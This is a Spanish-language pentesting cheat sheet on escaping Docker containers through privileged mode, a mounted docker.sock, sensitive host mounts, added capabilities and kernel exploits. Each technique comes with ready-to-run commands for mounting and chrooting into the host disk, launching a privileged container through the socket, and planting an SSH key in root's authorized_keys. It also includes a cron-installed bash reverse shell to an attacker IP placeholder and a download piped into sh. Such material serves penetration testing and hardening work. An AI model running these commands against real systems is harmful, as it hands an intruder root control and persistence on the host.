
## técnicas más comunes para escapar de un contenedor Docker en un contexto de pentesting, ordenadas de la más frecuente a la menos común:

   1. Contenedores Privilegiados (`--privileged`):
       * Descripción: Es la causa más común. Si un contenedor se ejecuta con el flag --privileged, se desactivan casi todas las medidas de aislamiento. El contenedor obtiene acceso a todos los dispositivos del host (en /dev), lo que
         permite, por ejemplo, montar el disco duro del sistema anfitrión (host) y tener control total sobre él.
       * Técnica de Escape: Desde dentro del contenedor, se puede montar el sistema de archivos del host (ej: mount /dev/sda1 /mnt) y luego simplemente hacer chroot /mnt para obtener una shell en el host.

   2. Montaje del Socket de Docker (`docker.sock`):
       * Descripción: A veces, el socket de Docker del host (/var/run/docker.sock) se monta dentro de un contenedor para que este pueda gestionar otros contenedores. Esto es un gran riesgo de seguridad.
       * Técnica de Escape: Si tienes acceso al socket, puedes instalar el cliente de Docker dentro de tu contenedor. Luego, usas ese cliente para comunicarte con el demonio de Docker del host y lanzar un nuevo contenedor privilegiado,
         dándote control total sobre el host.
       * Comando: docker -H unix:///var/run/docker.sock run -it --privileged --mount type=bind,source=/,target=/host alpine chroot /host

   3. Montaje de Volúmenes Sensibles del Host:
       * Descripción: Montar directorios críticos del host (como /, /root, /etc, etc.) dentro del contenedor.
       * Técnica de Escape:
           * Montando `/`: Tienes acceso a todo el sistema de archivos del host. Puedes añadir tu clave SSH a /root/.ssh/authorized_keys, crear un cron job en /etc/cron.d/, o modificar archivos de sistema para obtener acceso.
           * Montando `/etc`: Puedes intentar modificar archivos como /etc/passwd o /etc/shadow (si tienes permisos) o añadir tareas programadas.

   4. Capacidades de Linux Inseguras (`--cap-add`):
       * Descripción: Docker elimina muchas "capacidades" de Linux por defecto para limitar lo que root puede hacer dentro de un contenedor. Sin embargo, a veces se añaden capacidades peligrosas de vuelta.
       * Técnica de Escape: La capacidad SYS_ADMIN es una de las más peligrosas, ya que concede permisos para realizar muchas tareas administrativas, incluido el montaje de sistemas de archivos (similar a un contenedor privilegiado).
         Otras como SYS_PTRACE pueden permitir la inyección en procesos del host.

   5. Explotación de Vulnerabilidades del Kernel (CVEs):
       * Descripción: Todos los contenedores en un host comparten el mismo kernel. Si hay una vulnerabilidad en el kernel del host que permita una escalada de privilegios, se puede explotar desde dentro de un contenedor para "escapar" y
         tomar control del host.
       * Técnica de Escape: Requiere encontrar un exploit específico para la versión del kernel del host, compilarlo y ejecutarlo dentro del contenedor. Esto es menos común porque depende de una vulnerabilidad específica y no de una
         mala configuración.

  En resumen, la gran mayoría de los escapes de contenedores se deben a malas configuraciones que rompen el aislamiento deliberadamente, y no a fallos en la tecnología de contenedores en sí misma.

## comandos de enumeración y explotación para cada técnica.

  1. Contenedores Privilegiados (--privileged)

   * Enumeración:
       * Desde el host: 
       
       ```bash
       docker inspect --format='{{.HostConfig.Privileged}}' [ID_CONTENEDOR] (devuelve true o false)
       ```
       * Desde el contenedor: 
       
       ```bash
       cat /proc/self/status | grep CapEff y buscar una máscara de capacidades completa (ffffffffffffffff). O simplemente, intentar acceder a dispositivos del host: ls /dev/sda1
       ```
   * Explotación:
       * `fdisk -l`(para listar los discos del host)
       * `mkdir /host`
       * `mount /dev/sda1 /host` (o el disco que corresponda)
       * `chroot /host bash` (para obtener una shell como root en el host)

  2. Montaje del Socket de Docker (docker.sock)

   * Enumeración:
       * `find / -name "docker.sock"` (para buscar el socket)

   * Explotación:
       * Instalar cliente de Docker si no está: curl -fsSL https://get.docker.com -o get-docker.sh && sh get-docker.sh
       * docker -H unix:///var/run/docker.sock run -it --privileged --mount type=bind,source=/,target=/host alpine chroot /host

  3. Montaje de Volúmenes Sensibles del Host

   * Enumeración:
       * mount
       * cat /proc/mounts
       * ls -l / (para ver si hay directorios que no deberían estar)

   * Explotación:
       * Ejemplo con `/root` montado en `/mnt/root`:
           * echo "MI_CLAVE_PUBLICA_SSH" >> /mnt/root/.ssh/authorized_keys (para acceder por SSH al host)
       * Ejemplo con `/etc` montado en `/mnt/etc`:
           * echo '*/1 * * * * root /bin/bash -c "bash -i >& /dev/tcp/IP_ATACANTE/PUERTO 0>&1"' > /mnt/etc/cron.d/reverse-shell (para obtener una reverse shell)

  4. Capacidades de Linux Inseguras (--cap-add)

   * Enumeración:
       * cat /proc/self/status | grep Cap
       * capsh --print

   * Explotación (con `SYS_ADMIN`):
       * La capacidad SYS_ADMIN permite hacer casi de todo, incluyendo el montaje de dispositivos. El método es similar al de un contenedor privilegiado.
       * fdisk -l
       * mkdir /host
       * mount /dev/sda1 /host
       * chroot /host bash
   * Explotación (con `SYS_PTRACE`):
       * Permite inyectar código en procesos. Se puede intentar inyectar en un proceso que se ejecute como root en el host.

  5. Explotación de Vulnerabilidades del Kernel (CVEs)

   * Enumeración:
       * uname -a (para obtener la versión del kernel)

   * Explotación:
       * Buscar exploits para la versión del kernel en https://www.exploit-db.com/ (https://www.exploit-db.com/) o con herramientas como searchsploit.
       * Ejemplo: searchsploit Linux Kernel [VERSION] privilege escalation
       * Bajar el exploit, compilarlo (si es necesario) y ejecutarlo.
